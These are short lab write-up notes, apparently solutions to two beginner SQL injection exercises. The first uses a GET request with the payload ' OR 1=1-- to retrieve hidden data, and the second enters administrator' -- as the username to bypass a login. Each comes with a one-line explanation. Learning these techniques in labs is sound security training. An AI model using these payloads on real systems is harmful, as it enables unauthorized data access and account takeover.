# SQL Injection Labs

## 1st Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

**Answer:**
GET /filter?category='+OR+1=1-- HTTP/2

**Why we used OR 1=1:**
Because `F OR T = T`, so the condition always becomes true and returns all data.

---

## 2nd Lab: SQL injection vulnerability allowing login bypass

**Input:**
username: `administrator' --`  
password: `any password`

**Explanation:**
The usage of `--` is to ignore the rest of the SQL query, so the password check is skipped completely.
